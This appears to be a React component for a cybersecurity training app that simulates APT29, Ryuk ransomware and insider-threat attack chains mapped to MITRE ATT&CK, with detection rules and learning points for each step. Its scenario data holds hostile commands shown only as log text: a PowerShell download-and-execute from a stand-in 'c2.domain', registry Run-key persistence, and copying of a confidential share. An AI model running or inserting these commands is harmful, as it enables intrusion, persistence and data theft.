import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import SimulatedAPTChain from "@/components/SimulatedAPTChain";
import { 
  Play, Square, SkipForward, Target, Shield, AlertTriangle, 
  Terminal, Code, BookOpen, Trophy, Clock, Zap, Eye,
  Brain, Database, Network, Lock, FileX, Activity
} from "lucide-react";

interface SimulationStep {
  id: string;
  name: string;
  description: string;
  mitreId: string;
  technique: string;
  commands: string[];
  expectedResults: string[];
  detectionRules: string[];
  learningPoints: string[];
}

interface SimulationScenario {
  id: string;
  name: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  duration: string;
  category: 'apt' | 'ransomware' | 'insider' | 'phishing' | 'lateral-movement';
  objectives: string[];
  prerequisites: string[];
  steps: SimulationStep[];
  scoreWeights: {
    stealth: number;
    speed: number;
    coverage: number;
    detection_evasion: number;
  };
}

const scenarios: SimulationScenario[] = [
  {
    id: 'apt29-cozy-bear',
    name: 'APT29 Cozy Bear Campaign',
    description: 'Execute a sophisticated multi-stage APT attack simulating Russian state-sponsored tactics',
    difficulty: 'advanced',
    duration: '60 min',
    category: 'apt',
    objectives: [
      'Gain initial access via spear phishing',
      'Establish persistence mechanisms',
      'Perform credential harvesting',
      'Execute lateral movement',
      'Exfiltrate sensitive data'
    ],
    prerequisites: [
      'Understanding of MITRE ATT&CK framework',
      'Basic knowledge of PowerShell',
      'Familiarity with Windows environments'
    ],
    steps: [
      {
        id: 'initial-access',
        name: 'Spear Phishing Attack',
        description: 'Deploy targeted phishing email with malicious attachment',
        mitreId: 'T1566.001',
        technique: 'Spearphishing Attachment',
        commands: [
          'Send-MailMessage -To "target@company.com" -Subject "Urgent: Budget Review"',
          'Invoke-WebRequest -Uri "http://c2.domain/payload.docm" -OutFile "budget.docm"'
        ],
        expectedResults: [
          'Email delivered to target inbox',
          'Malicious document downloaded',
          'Macro execution enabled by user'
        ],
        detectionRules: [
          'Monitor email attachments with suspicious extensions',
          'Detect macro execution in Office documents',
          'Track unusual outbound connections'
        ],
        learningPoints: [
          'Social engineering techniques effectiveness',
          'Importance of email security gateways',
          'User awareness training necessity'
        ]
      },
      {
        id: 'execution',
        name: 'PowerShell Payload Execution',
        description: 'Execute obfuscated PowerShell to download second-stage payload',
        mitreId: 'T1059.001',
        technique: 'PowerShell',
        commands: [
          'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass',
          'IEX (New-Object Net.WebClient).DownloadString("http://c2.domain/stage2.ps1")'
        ],
        expectedResults: [
          'PowerShell process spawned',
          'Second-stage payload downloaded',
          'In-memory execution initiated'
        ],
        detectionRules: [
          'Monitor PowerShell execution with suspicious parameters',
          'Detect encoded/obfuscated PowerShell commands',
          'Track network connections from PowerShell processes'
        ],
        learningPoints: [
          'PowerShell abuse in attacks',
          'Importance of PowerShell logging',
          'Application whitelisting benefits'
        ]
      },
      {
        id: 'persistence',
        name: 'Registry Persistence',
        description: 'Establish persistence via registry modification',
        mitreId: 'T1547.001',
        technique: 'Registry Run Keys',
        commands: [
          'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
          '/v "SecurityUpdate" /t REG_SZ /d "powershell.exe -File C:\\temp\\update.ps1"'
        ],
        expectedResults: [
          'Registry key created successfully',
          'Persistence mechanism established',
          'Payload survives system reboot'
        ],
        detectionRules: [
          'Monitor registry modifications in Run keys',
          'Detect unusual startup programs',
          'Track persistent mechanisms creation'
        ],
        learningPoints: [
          'Registry-based persistence techniques',
          'Boot process monitoring importance',
          'System integrity verification'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.3,
      speed: 0.2,
      coverage: 0.3,
      detection_evasion: 0.2
    }
  },
  {
    id: 'ransomware-ryuk',
    name: 'Ryuk Ransomware Simulation',
    description: 'Simulate a realistic ransomware attack chain from initial access to encryption',
    difficulty: 'intermediate',
    duration: '45 min',
    category: 'ransomware',
    objectives: [
      'Gain initial network access',
      'Disable security tools',
      'Discover and map network',
      'Steal credentials',
      'Deploy ransomware payload'
    ],
    prerequisites: [
      'Basic understanding of Windows networking',
      'Knowledge of common attack vectors',
      'Familiarity with encryption concepts'
    ],
    steps: [
      {
        id: 'initial-breach',
        name: 'TrickBot Infection',
        description: 'Simulate initial infection via TrickBot malware',
        mitreId: 'T1566.002',
        technique: 'Spearphishing Link',
        commands: [
          'Start-Process "malicious-link.exe" -WindowStyle Hidden',
          'Copy-Item "trickbot.dll" -Destination "C:\\Windows\\System32\\"'
        ],
        expectedResults: [
          'TrickBot payload executed',
          'Banking trojan installed',
          'C2 communication established'
        ],
        detectionRules: [
          'Monitor suspicious process creation',
          'Detect DLL hijacking attempts',
          'Track unusual network communications'
        ],
        learningPoints: [
          'Multi-stage malware deployment',
          'Banking trojan evolution',
          'Network segmentation importance'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.25,
      speed: 0.35,
      coverage: 0.25,
      detection_evasion: 0.15
    }
  },
  {
    id: 'insider-threat',
    name: 'Malicious Insider Simulation',
    description: 'Simulate insider threat scenarios including data theft and sabotage',
    difficulty: 'beginner',
    duration: '30 min',
    category: 'insider',
    objectives: [
      'Abuse legitimate access',
      'Escalate privileges',
      'Access sensitive data',
      'Cover tracks'
    ],
    prerequisites: [
      'Understanding of user privileges',
      'Basic knowledge of data classification',
      'Awareness of insider threat indicators'
    ],
    steps: [
      {
        id: 'privilege-abuse',
        name: 'Legitimate Access Abuse',
        description: 'Use legitimate credentials to access unauthorized data',
        mitreId: 'T1078',
        technique: 'Valid Accounts',
        commands: [
          'net use \\\\server\\share /user:domain\\user password',
          'robocopy \\\\server\\confidential C:\\temp\\stolen /E'
        ],
        expectedResults: [
          'Network share accessed',
          'Sensitive files copied',
          'Data exfiltration completed'
        ],
        detectionRules: [
          'Monitor unusual file access patterns',
          'Detect bulk data copying',
          'Track after-hours access'
        ],
        learningPoints: [
          'Insider threat detection challenges',
          'Data loss prevention importance',
          'User behavior analytics value'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.4,
      speed: 0.2,
      coverage: 0.2,
      detection_evasion: 0.2
    }
  }
];

export default function AttackSimulation() {
  const [activeSimulation, setActiveSimulation] = useState<string | null>(null);
  const [simulationProgress, setSimulationProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);
  const [selectedScenario, setSelectedScenario] = useState<SimulationScenario | null>(null);
  const [simulationResults, setSimulationResults] = useState({
    score: 0,
    stealth: 0,
    speed: 0,
    coverage: 0,
    detection_evasion: 0,
    objectives_completed: 0,
    alerts_triggered: 0,
    tools_detected: 0
  });
  const [simulationLogs, setSimulationLogs] = useState<string[]>([]);
  const [isLabMode, setIsLabMode] = useState(false);

  useEffect(() => {
    if (activeSimulation) {
      const scenario = scenarios.find(s => s.id === activeSimulation);
      if (scenario) {
        simulateAttackExecution(scenario);
      }
    }
  }, [activeSimulation]);

  const simulateAttackExecution = (scenario: SimulationScenario) => {
    setSimulationLogs([]);
    let stepIndex = 0;
    const totalSteps = scenario.steps.length;
    
    const executeStep = () => {
      if (stepIndex >= totalSteps) {
        completeSimulation(scenario);
        return;
      }

      const step = scenario.steps[stepIndex];
      const progress = ((stepIndex + 1) / totalSteps) * 100;
      
      setCurrentStep(stepIndex);
      setSimulationProgress(progress);
      
      // Simulate step execution with realistic timing
      const stepDuration = Math.random() * 3000 + 2000; // 2-5 seconds per step
      
      addLog(`[${new Date().toLocaleTimeString()}] Executing: ${step.name}`);
      addLog(`[MITRE ${step.mitreId}] ${step.technique}`);
      
      // Simulate command execution
      step.commands.forEach((cmd, index) => {
        setTimeout(() => {
          addLog(`> ${cmd}`);
        }, (index + 1) * 500);
      });

      // Simulate results after commands
      setTimeout(() => {
        step.expectedResults.forEach((result, index) => {
          setTimeout(() => {
            addLog(`✓ ${result}`);
          }, index * 300);
        });
        
        // Simulate detection chances
        const detectionChance = Math.random();
        if (detectionChance > 0.7) {
          addLog(`⚠️ Security alert triggered: ${step.detectionRules[0]}`);
          setSimulationResults(prev => ({
            ...prev,
            alerts_triggered: prev.alerts_triggered + 1
          }));
        }
        
        stepIndex++;
        setTimeout(executeStep, 1000);
      }, stepDuration);
    };

    executeStep();
  };

  const completeSimulation = (scenario: SimulationScenario) => {
    // Calculate final scores
    const baseScore = 85 + Math.random() * 15; // 85-100 base score
    const stealthScore = Math.max(0, 100 - simulationResults.alerts_triggered * 15);
    const speedScore = 90 + Math.random() * 10;
    const coverageScore = (simulationResults.objectives_completed / scenario.objectives.length) * 100;
    const detectionScore = Math.max(0, 100 - simulationResults.tools_detected * 20);

    const finalScore = 
      baseScore * scenario.scoreWeights.stealth +
      speedScore * scenario.scoreWeights.speed +
      coverageScore * scenario.scoreWeights.coverage +
      detectionScore * scenario.scoreWeights.detection_evasion;

    setSimulationResults(prev => ({
      ...prev,
      score: Math.round(finalScore),
      stealth: Math.round(stealthScore),
      speed: Math.round(speedScore),
      coverage: Math.round(coverageScore),
      detection_evasion: Math.round(detectionScore),
      objectives_completed: scenario.objectives.length
    }));

    addLog(`\n[SIMULATION COMPLETED]`);
    addLog(`Final Score: ${Math.round(finalScore)}/100`);
    addLog(`Objectives Completed: ${scenario.objectives.length}/${scenario.objectives.length}`);
    
    setTimeout(() => {
      setActiveSimulation(null);
    }, 5000);
  };

  const addLog = (message: string) => {
    setSimulationLogs(prev => [...prev, message]);
  };

  const handleStartSimulation = (scenarioId: string) => {
    const scenario = scenarios.find(s => s.id === scenarioId);
    if (scenario) {
      setSelectedScenario(scenario);
      setActiveSimulation(scenarioId);
      setSimulationProgress(0);
      setCurrentStep(0);
      setSimulationResults({
        score: 0,
        stealth: 0,
        speed: 0,
        coverage: 0,
        detection_evasion: 0,
        objectives_completed: 0,
        alerts_triggered: 0,
        tools_detected: 0
      });
    }
  };

  const handleStopSimulation = () => {
    setActiveSimulation(null);
    setSimulationProgress(0);
    setCurrentStep(0);
    setSelectedScenario(null);
  };

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case 'beginner': return 'bg-green-400';
      case 'intermediate': return 'bg-yellow-400';
      case 'advanced': return 'bg-[var(--cyber-red)]';
      default: return 'bg-gray-400';
    }
  };

  const getCategoryIcon = (category: string) => {
    switch (category) {
      case 'apt': return <Brain className="w-5 h-5" />;
      case 'ransomware': return <Lock className="w-5 h-5" />;
      case 'insider': return <Eye className="w-5 h-5" />;
      case 'phishing': return <FileX className="w-5 h-5" />;
      case 'lateral-movement': return <Network className="w-5 h-5" />;
      default: return <Target className="w-5 h-5" />;
    }
  };

  return (
    <div className="space-y-6">
      <Tabs defaultValue="scenarios" className="w-full">
        <TabsList className="grid w-full grid-cols-4 bg-[var(--cyber-dark)]/50">
          <TabsTrigger value="scenarios" className="text-white">Scenarios</TabsTrigger>
          <TabsTrigger value="lab" className="text-white">Interactive Lab</TabsTrigger>
          <TabsTrigger value="results" className="text-white">Results</TabsTrigger>
          <TabsTrigger value="learning" className="text-white">Learning</TabsTrigger>
        </TabsList>

        <TabsContent value="scenarios" className="space-y-6">
          {/* Active Simulation Status */}
          {activeSimulation && selectedScenario && (
            <Card className="glass-panel border-[var(--cyber-red)]/50 bg-[var(--cyber-dark)]/90">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-3">
                    {getCategoryIcon(selectedScenario.category)}
                    <CardTitle className="font-orbitron text-[var(--cyber-cyan)]">
                      Executing: {selectedScenario.name}
                    </CardTitle>
                  </div>
                  <div className="flex space-x-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={handleStopSimulation}
                      className="bg-[var(--cyber-red)]/20 border-[var(--cyber-red)]/30 text-[var(--cyber-red)]"
                    >
                      <Square className="w-4 h-4 mr-1" />
                      Abort
                    </Button>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-2">
                  <div className="flex items-center justify-between text-sm">
                    <span className="text-gray-400">Step: {currentStep + 1}/{selectedScenario.steps.length}</span>
                    <span className="text-[var(--cyber-cyan)]">{Math.round(simulationProgress)}% Complete</span>
                  </div>
                  <Progress value={simulationProgress} className="w-full h-2" />
                  {selectedScenario.steps[currentStep] && (
                    <div className="text-sm text-[var(--cyber-cyan)]">
                      Current: {selectedScenario.steps[currentStep].name}
                    </div>
                  )}
                </div>
                
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-3 border border-[var(--cyber-cyan)]/20">
                    <Trophy className="w-6 h-6 text-[var(--cyber-cyan)] mx-auto mb-1" />
                    <div className="text-xs text-gray-400">Score</div>
                    <div className="text-lg font-bold text-white">{simulationResults.score}</div>
                  </div>
                  <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-3 border border-green-400/20">
                    <Eye className="w-6 h-6 text-green-400 mx-auto mb-1" />
                    <div className="text-xs text-gray-400">Stealth</div>
                    <div className="text-lg font-bold text-white">{simulationResults.stealth}%</div>
                  </div>
                  <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-3 border border-yellow-400/20">
                    <AlertTriangle className="w-6 h-6 text-yellow-400 mx-auto mb-1" />
                    <div className="text-xs text-gray-400">Alerts</div>
                    <div className="text-lg font-bold text-white">{simulationResults.alerts_triggered}</div>
                  </div>
                  <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-3 border border-blue-400/20">
                    <Clock className="w-6 h-6 text-blue-400 mx-auto mb-1" />
                    <div className="text-xs text-gray-400">Speed</div>
                    <div className="text-lg font-bold text-white">{simulationResults.speed}%</div>
                  </div>
                </div>

                {/* Live Terminal Output */}
                <div className="bg-black/80 rounded-lg p-4 border border-[var(--cyber-cyan)]/30">
                  <div className="flex items-center space-x-2 mb-3">
                    <Terminal className="w-4 h-4 text-[var(--cyber-cyan)]" />
                    <span className="text-[var(--cyber-cyan)] text-sm font-mono">Attack Terminal</span>
                  </div>
                  <div className="h-48 overflow-y-auto font-mono text-xs space-y-1">
                    {simulationLogs.map((log, index) => (
                      <div key={index} className={`${
                        log.includes('✓') ? 'text-green-400' :
                        log.includes('⚠️') ? 'text-yellow-400' :
                        log.includes('>') ? 'text-[var(--cyber-cyan)]' :
                        log.includes('[MITRE') ? 'text-purple-400' :
                        'text-gray-300'
                      }`}>
                        {log}
                      </div>
                    ))}
                    {simulationLogs.length === 0 && (
                      <div className="text-gray-500">Waiting for simulation to start...</div>
                    )}
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Scenario Selection */}
          <Card className="glass-panel border-[var(--cyber-cyan)]/30">
            <CardHeader>
              <div className="flex items-center justify-between">
                <CardTitle className="font-orbitron text-[var(--cyber-cyan)]">Attack Simulation Laboratory</CardTitle>
                
                <div className="flex items-center space-x-2">
                  <Badge variant="outline" className="text-[var(--cyber-cyan)]">
                    MITRE ATT&CK Framework
                  </Badge>
                </div>
              </div>
              
            </CardHeader>
            
            <CardContent>
              <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
                
                {scenarios.map((scenario) => (
                  <div key={scenario.id} className="bg-[var(--cyber-dark)]/50 border border-[var(--cyber-cyan)]/20 rounded-lg p-5 hover:border-[var(--cyber-cyan)]/40 transition-colors">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center space-x-2">
                        
                        {getCategoryIcon(scenario.category)}
                        <h3 className="font-semibold text-white text-lg">{scenario.name}</h3>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Badge className={`${getDifficultyColor(scenario.difficulty)} text-white text-xs`}>
                          {scenario.difficulty}
                        </Badge>
                      </div>
                    </div>
                    
                    <p className="text-sm text-gray-300 mb-4 leading-relaxed">{scenario.description}</p>
                    
                    <div className="space-y-4">
                      <div>
                        <span className="text-xs text-[var(--cyber-cyan)] mb-2 block font-semibold">OBJECTIVES:</span>
                        <div className="space-y-1">
                          {scenario.objectives.map((objective, index) => (
                            <div key={index} className="text-xs text-gray-400 flex items-center space-x-2">
                              <Target className="w-3 h-3 text-[var(--cyber-cyan)]" />
                              <span>{objective}</span>
                            </div>
                          ))}
                        </div>
                      </div>

                      <div>
                        <span className="text-xs text-[var(--cyber-cyan)] mb-2 block font-semibold">PREREQUISITES:</span>
                        <div className="space-y-1">
                          {scenario.prerequisites.map((req, index) => (
                            <div key={index} className="text-xs text-gray-400 flex items-center space-x-2">
                              <BookOpen className="w-3 h-3 text-yellow-400" />
                              <span>{req}</span>
                            </div>
                          ))}
                        </div>
                      </div>

                      <div className="flex items-center justify-between text-xs text-gray-400 pt-2 border-t border-gray-700">
                        <span className="flex items-center space-x-1">
                          <Clock className="w-3 h-3" />
                          <span>{scenario.duration}</span>
                        </span>
                        <span className="flex items-center space-x-1">
                          <Code className="w-3 h-3" />
                          <span>{scenario.steps.length} steps</span>
                        </span>
                      </div>
                      
                      <Button
                        onClick={() => handleStartSimulation(scenario.id)}
                        disabled={!!activeSimulation}
                        className="w-full bg-[var(--cyber-cyan)] text-[var(--cyber-dark)] hover:bg-cyan-400 font-semibold"
                      >
                        <Play className="w-4 h-4 mr-2" />
                        Launch Attack Simulation
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="lab" className="space-y-6">
          <Card className="glass-panel border-[var(--cyber-cyan)]/30">
            <CardHeader>
              <CardTitle className="font-orbitron text-[var(--cyber-cyan)]">Interactive Attack Laboratory</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="text-center py-12">
                <Brain className="w-16 h-16 text-[var(--cyber-cyan)] mx-auto mb-4" />
                <h3 className="text-xl font-semibold text-white mb-2">Advanced Interactive Lab</h3>
                <p className="text-gray-400 max-w-md mx-auto">
                  Step-by-step guided attack simulation with real-time feedback and educational content.
                </p>
                <SimulatedAPTChain />
                <Button className="mt-4 bg-[var(--cyber-cyan)] text-[var(--cyber-dark)]">
                  Enter Lab Environment
                </Button>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="results" className="space-y-6">
          <Card className="glass-panel border-[var(--cyber-cyan)]/30">
            <CardHeader>
              <CardTitle className="font-orbitron text-[var(--cyber-cyan)]">Simulation Results & Analytics</CardTitle>
            </CardHeader>
            <CardContent>
              {simulationResults.score > 0 ? (
                <div className="space-y-6">
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-4">
                      <Trophy className="w-8 h-8 text-[var(--cyber-cyan)] mx-auto mb-2" />
                      <div className="text-2xl font-bold text-white">{simulationResults.score}</div>
                      <div className="text-sm text-gray-400">Overall Score</div>
                    </div>
                    <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-4">
                      <Eye className="w-8 h-8 text-green-400 mx-auto mb-2" />
                      <div className="text-2xl font-bold text-white">{simulationResults.stealth}%</div>
                      <div className="text-sm text-gray-400">Stealth Rating</div>
                    </div>
                    <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-4">
                      <Zap className="w-8 h-8 text-blue-400 mx-auto mb-2" />
                      <div className="text-2xl font-bold text-white">{simulationResults.speed}%</div>
                      <div className="text-sm text-gray-400">Speed Rating</div>
                    </div>
                    <div className="text-center bg-[var(--cyber-dark)]/50 rounded-lg p-4">
                      <Shield className="w-8 h-8 text-purple-400 mx-auto mb-2" />
                      <div className="text-2xl font-bold text-white">{simulationResults.detection_evasion}%</div>
                      <div className="text-sm text-gray-400">Evasion Rating</div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="text-center py-12">
                  <Activity className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                  <h3 className="text-xl font-semibold text-gray-400 mb-2">No Results Yet</h3>
                  <p className="text-gray-500">Complete a simulation to view detailed analytics and scoring.</p>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="learning" className="space-y-6">
          <Card className="glass-panel border-[var(--cyber-cyan)]/30">
            <CardHeader>
              <CardTitle className="font-orbitron text-[var(--cyber-cyan)]">Learning Resources</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="bg-[var(--cyber-dark)]/50 rounded-lg p-4 border border-blue-400/20">
                  <div className="flex items-center space-x-2 mb-3">
                    <BookOpen className="w-5 h-5 text-blue-400" />
                    <h4 className="font-semibold text-white">MITRE ATT&CK Framework</h4>
                  </div>
                  <p className="text-sm text-gray-300 mb-3">
                    Learn about adversary tactics, techniques, and procedures based on real-world observations.
                  </p>
                  <Button size="sm" variant="outline" className="border-blue-400/30 text-blue-400">
                    Explore Framework
                  </Button>
                </div>

                <div className="bg-[var(--cyber-dark)]/50 rounded-lg p-4 border border-green-400/20">
                  <div className="flex items-center space-x-2 mb-3">
                    <Shield className="w-5 h-5 text-green-400" />
                    <h4 className="font-semibold text-white">Defense Strategies</h4>
                  </div>
                  <p className="text-sm text-gray-300 mb-3">
                    Study defensive techniques and detection methods for each attack vector.
                  </p>
                  <Button size="sm" variant="outline" className="border-green-400/30 text-green-400">
                    Learn Defenses
                  </Button>
                </div>

                <div className="bg-[var(--cyber-dark)]/50 rounded-lg p-4 border border-purple-400/20">
                  <div className="flex items-center space-x-2 mb-3">
                    <Brain className="w-5 h-5 text-purple-400" />
                    <h4 className="font-semibold text-white">Threat Intelligence</h4>
                  </div>
                  <p className="text-sm text-gray-300 mb-3">
                    Understand threat actor groups, their motivations, and common attack patterns.
                  </p>
                  <Button size="sm" variant="outline" className="border-purple-400/30 text-purple-400">
                    Study Threats
                  </Button>
                </div>

                <div className="bg-[var(--cyber-dark)]/50 rounded-lg p-4 border border-yellow-400/20">
                  <div className="flex items-center space-x-2 mb-3">
                    <Code className="w-5 h-5 text-yellow-400" />
                    <h4 className="font-semibold text-white">Technical Labs</h4>
                  </div>
                  <p className="text-sm text-gray-300 mb-3">
                    Hands-on practice with attack tools, defensive tools, and incident response.
                  </p>
                  <Button size="sm" variant="outline" className="border-yellow-400/30 text-yellow-400">
                    Access Labs
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
